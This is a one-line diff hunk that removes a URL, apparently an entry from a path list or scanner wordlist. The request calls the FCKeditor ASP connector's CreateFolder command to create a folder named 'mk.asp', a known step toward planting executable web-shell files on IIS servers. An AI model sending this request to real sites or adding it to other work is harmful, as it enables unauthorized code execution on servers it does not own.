@@ -1,1 +1,0 @@
-/Admin/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/mk.asp&NewFolderName=mk.asp
